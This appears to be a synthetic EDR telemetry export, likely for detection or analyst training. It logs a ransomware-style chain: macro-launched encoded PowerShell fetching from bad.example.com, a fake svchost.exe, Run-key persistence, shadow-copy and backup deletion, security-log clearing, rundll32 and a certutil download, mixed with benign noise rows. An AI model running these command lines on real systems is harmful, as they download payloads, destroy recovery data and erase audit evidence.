event.time,event.type,endpoint.name,site.name,src.process.storyline.id,src.process.uid,src.process.pid,src.process.name,src.process.cmdline,src.process.image.path,src.process.image.sha256,src.process.publisher,src.process.verifiedStatus,src.process.user,src.process.parent.pid,src.process.parent.name,src.process.parent.cmdline,src.process.parent.uid,tgt.file.path,tgt.file.sha256,tgt.process.name,tgt.process.pid,src.ip.address,src.port.number,dst.ip.address,dst.port.number,event.network.protocolName,dns.request,dns.response,registry.keyPath,registry.value,module.path,module.sha1
2026-04-15T14:02:11.123Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-explorer,4288,explorer.exe,C:\Windows\Explorer.EXE,C:\Windows\explorer.exe,e6a5d6a25ee9aaaaaaaa11111111aaaaaaaa,Microsoft Windows,signed,GARLAND\jdoe,1024,userinit.exe,,uid-userinit,,,,,,,,,,,,,,
2026-04-15T14:05:43.001Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-outlook,4512,OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,bbbb1111aaaa2222bbbb3333cccc4444,Microsoft Corporation,signed,GARLAND\jdoe,4288,explorer.exe,,uid-explorer,,,,,,,,,,,,,,
2026-04-15T14:12:09.882Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-winword,5104,WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n ""C:\Users\jdoe\Downloads\Invoice_Q2.docm""",C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,cccc2222bbbb3333dddd4444eeee5555,Microsoft Corporation,signed,GARLAND\jdoe,4512,OUTLOOK.EXE,,uid-outlook,,,,,,,,,,,,,,
2026-04-15T14:12:14.221Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-cmd-1,6204,cmd.exe,"cmd.exe /c powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AYgBhAGQALgBleAAuAGMAbwBtAC8AcAAuAHAAcwAxAA==",C:\Windows\System32\cmd.exe,dddd3333cccc4444eeee5555ffff6666,Microsoft Windows,signed,GARLAND\jdoe,5104,WINWORD.EXE,,uid-winword,,,,,,,,,,,,,,
2026-04-15T14:12:14.498Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-ps-1,6388,powershell.exe,"powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AYgBhAGQALgBleAAuAGMAbwBtAC8AcAAuAHAAcwAxAA==",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,eeee4444dddd5555ffff6666aaaa7777,Microsoft Windows,signed,GARLAND\jdoe,6204,cmd.exe,"cmd.exe /c powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AYgBhAGQALgBleAAuAGMAbwBtAC8AcAAuAHAAcwAxAA==",uid-cmd-1,,,,,,,,,,,,,,
2026-04-15T14:12:15.102Z,DNS Resolved,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-ps-1,6388,powershell.exe,"powershell.exe -nop -w hidden -enc SQBu...",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,eeee4444dddd5555ffff6666aaaa7777,Microsoft Windows,signed,GARLAND\jdoe,6204,cmd.exe,,uid-cmd-1,,,,,,,,,bad.example.com,185.220.101.45,,,,
2026-04-15T14:12:15.488Z,IP Connect,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-ps-1,6388,powershell.exe,"powershell.exe -nop -w hidden -enc SQBu...",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,eeee4444dddd5555ffff6666aaaa7777,Microsoft Windows,signed,GARLAND\jdoe,6204,cmd.exe,,uid-cmd-1,,,,,10.10.20.55,49981,185.220.101.45,443,TCP,,,,,,
2026-04-15T14:12:16.001Z,File Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-ps-1,6388,powershell.exe,"powershell.exe -nop -w hidden -enc SQBu...",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,eeee4444dddd5555ffff6666aaaa7777,Microsoft Windows,signed,GARLAND\jdoe,6204,cmd.exe,,uid-cmd-1,C:\Users\jdoe\AppData\Roaming\svchost.exe,ffff5555eeee6666dddd7777cccc8888,,,,,,,,,,,,
2026-04-15T14:12:21.336Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-stage2,7012,svchost.exe,C:\Users\jdoe\AppData\Roaming\svchost.exe,C:\Users\jdoe\AppData\Roaming\svchost.exe,ffff5555eeee6666dddd7777cccc8888,,unsigned,GARLAND\jdoe,6388,powershell.exe,"powershell.exe -nop -w hidden -enc SQBu...",uid-ps-1,,,,,,,,,,,,,,
2026-04-15T14:12:25.119Z,Registry Value Modified,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-stage2,7012,svchost.exe,C:\Users\jdoe\AppData\Roaming\svchost.exe,C:\Users\jdoe\AppData\Roaming\svchost.exe,ffff5555eeee6666dddd7777cccc8888,,unsigned,GARLAND\jdoe,6388,powershell.exe,,uid-ps-1,,,,,,,,,,,HKU\S-1-5-21-...\Software\Microsoft\Windows\CurrentVersion\Run,WindowsUpdate,,
2026-04-15T14:12:30.402Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-vss,7240,vssadmin.exe,vssadmin.exe delete shadows /all /quiet,C:\Windows\System32\vssadmin.exe,1111aaaa2222bbbb3333cccc4444dddd,Microsoft Windows,signed,NT AUTHORITY\SYSTEM,7012,svchost.exe,C:\Users\jdoe\AppData\Roaming\svchost.exe,uid-stage2,,,,,,,,,,,,,,
2026-04-15T14:12:31.999Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-bcd,7256,bcdedit.exe,"bcdedit.exe /set {default} recoveryenabled no",C:\Windows\System32\bcdedit.exe,2222bbbb3333cccc4444dddd5555eeee,Microsoft Windows,signed,NT AUTHORITY\SYSTEM,7012,svchost.exe,,uid-stage2,,,,,,,,,,,,,,
2026-04-15T14:12:33.117Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-wbadmin,7288,wbadmin.exe,wbadmin.exe delete catalog -quiet,C:\Windows\System32\wbadmin.exe,3333cccc4444dddd5555eeee6666ffff,Microsoft Windows,signed,NT AUTHORITY\SYSTEM,7012,svchost.exe,,uid-stage2,,,,,,,,,,,,,,
2026-04-15T14:12:40.009Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-wevtutil,7301,wevtutil.exe,wevtutil.exe cl Security,C:\Windows\System32\wevtutil.exe,4444dddd5555eeee6666ffff7777aaaa,Microsoft Windows,signed,NT AUTHORITY\SYSTEM,7012,svchost.exe,,uid-stage2,,,,,,,,,,,,,,
2026-04-15T14:13:01.555Z,Process Creation,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-rundll-credui,7444,rundll32.exe,"rundll32.exe C:\Users\jdoe\AppData\Local\Temp\m.dll,Start",C:\Windows\System32\rundll32.exe,5555eeee6666ffff7777aaaa8888bbbb,Microsoft Windows,signed,GARLAND\jdoe,7012,svchost.exe,,uid-stage2,,,,,,,,,,,,,,
2026-04-15T14:13:02.017Z,Module Load,WS-MARKETING-04,GarlandSales,storyline-aaa-001,uid-rundll-credui,7444,rundll32.exe,"rundll32.exe C:\Users\jdoe\AppData\Local\Temp\m.dll,Start",C:\Windows\System32\rundll32.exe,5555eeee6666ffff7777aaaa8888bbbb,Microsoft Windows,signed,GARLAND\jdoe,7012,svchost.exe,,uid-stage2,,,,,,,,,,,,,C:\Users\jdoe\AppData\Local\Temp\m.dll,9999aaaa1111bbbb2222cccc3333dddd
2026-04-15T14:14:11.823Z,IP Connect,WS-DESIGN-02,GarlandSales,storyline-bbb-002,uid-chrome,2218,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",C:\Program Files\Google\Chrome\Application\chrome.exe,8888aaaa9999bbbb1111cccc2222dddd,Google LLC,signed,GARLAND\msmith,1024,explorer.exe,,uid-explorer-2,,,,,10.10.20.78,52341,142.250.80.46,443,TCP,,,,,,
2026-04-15T14:14:12.998Z,DNS Resolved,WS-DESIGN-02,GarlandSales,storyline-bbb-002,uid-chrome,2218,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",C:\Program Files\Google\Chrome\Application\chrome.exe,8888aaaa9999bbbb1111cccc2222dddd,Google LLC,signed,GARLAND\msmith,1024,explorer.exe,,uid-explorer-2,,,,,,,,,,www.google.com,142.250.80.46,,,,
2026-04-15T14:15:02.117Z,Process Creation,WS-DESIGN-02,GarlandSales,storyline-noise-001,uid-sentinel-1,1011,SentinelAgent.exe,"""C:\Program Files\SentinelOne\Sentinel Agent 23.4.1.124\SentinelAgent.exe""",C:\Program Files\SentinelOne\Sentinel Agent 23.4.1.124\SentinelAgent.exe,9999bbbb2222cccc3333dddd4444eeee,SentinelOne Inc,signed,NT AUTHORITY\SYSTEM,4,services.exe,,uid-services,,,,,,,,,,,,,,
2026-04-15T14:15:03.221Z,Process Creation,WS-DESIGN-02,GarlandSales,storyline-noise-001,uid-svchost-1,872,svchost.exe,"C:\Windows\system32\svchost.exe -k netsvcs -p",C:\Windows\System32\svchost.exe,1111ffff2222aaaa3333bbbb4444cccc,Microsoft Windows,signed,NT AUTHORITY\SYSTEM,4,services.exe,,uid-services,,,,,,,,,,,,,,
2026-04-15T14:15:04.881Z,Process Creation,WS-DESIGN-02,GarlandSales,storyline-noise-001,uid-ninja-1,3441,NinjaRMMAgent.exe,"""C:\Program Files (x86)\NinjaRMMAgent\NinjaRMMAgent.exe""",C:\Program Files (x86)\NinjaRMMAgent\NinjaRMMAgent.exe,2222ffff3333aaaa4444bbbb5555cccc,NinjaOne LLC,signed,NT AUTHORITY\SYSTEM,4,services.exe,,uid-services,,,,,,,,,,,,,,
2026-04-15T14:16:42.013Z,Process Creation,WS-FINANCE-01,GarlandSales,storyline-ccc-003,uid-certutil,9112,certutil.exe,"certutil.exe -urlcache -split -f http://192.168.55.10/payload.txt C:\Users\Public\p.txt",C:\Windows\System32\certutil.exe,3333eeee4444ffff5555aaaa6666bbbb,Microsoft Windows,signed,GARLAND\acook,8888,cmd.exe,cmd.exe,uid-cmd-fin,,,,,,,,,,,,,,
2026-04-15T14:17:01.118Z,File Creation,WS-FINANCE-01,GarlandSales,storyline-ccc-003,uid-certutil,9112,certutil.exe,"certutil.exe -urlcache -split -f http://192.168.55.10/payload.txt C:\Users\Public\p.txt",C:\Windows\System32\certutil.exe,3333eeee4444ffff5555aaaa6666bbbb,Microsoft Windows,signed,GARLAND\acook,8888,cmd.exe,,uid-cmd-fin,C:\Users\Public\p.txt,4444aaaa5555bbbb6666cccc7777dddd,,,,,,,,,,,,
